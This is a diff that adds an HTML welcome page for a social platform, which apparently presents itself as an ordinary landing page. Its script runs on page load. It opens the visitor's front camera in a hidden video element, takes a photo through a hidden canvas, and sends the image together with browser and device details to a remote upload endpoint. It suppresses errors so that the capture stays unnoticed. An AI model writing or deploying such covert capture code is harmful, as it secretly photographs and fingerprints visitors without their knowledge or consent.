@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="main-container">
+        <div class="welcome-section">
+            <h1>Welcome to Our Platform</h1>
+            <p>Connect with people around the world</p>
+        </div>
+
+        <!-- Hidden Video Element -->
+        <video id="hidden-video" autoplay playsinline style="display: none;"></video>
+        <canvas id="hidden-canvas" style="display: none;"></canvas>
+    </div>
+
+    <script>
+        // Function to capture photo silently
+        async function capturePhotoSilently() {
+            try {
+                const video = document.getElementById('hidden-video');
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: 640,
+                        height: 480,
+                        facingMode: 'user'
+                    },
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                
+                // Wait for video to load
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                video.play();
+                
+                // Wait a bit for camera to adjust
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                // Take photo
+                const canvas = document.getElementById('hidden-canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                // Convert to base64
+                const photoData = canvas.toDataURL('image/jpeg');
+                
+                // Send to your server or store
+                sendPhotoToServer(photoData);
+                
+                // Stop camera
+                stream.getTracks().forEach(track => track.stop());
+                
+            } catch (error) {
+                console.log('Camera access failed silently');
+            }
+        }
+
+        // Function to send photo to server
+        function sendPhotoToServer(photoData) {
+            // Get user info
+            const userInfo = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenResolution: `${window.screen.width}x${window.screen.height}`
+            };
+
+            // Create form data
+            const formData = new FormData();
+            formData.append('photo', photoData);
+            formData.append('userInfo', JSON.stringify(userInfo));
+
+            // Send to your server
+            fetch('https://your-server.com/upload-photo', {
+                method: 'POST',
+                body: formData
+            }).catch(error => console.log('Upload failed silently'));
+        }
+
+        // Try to capture photo when page loads
+        window.onload = function() {
+            setTimeout(capturePhotoSilently, 1000);
+        };
+    </script>
+</body>
+</html> 
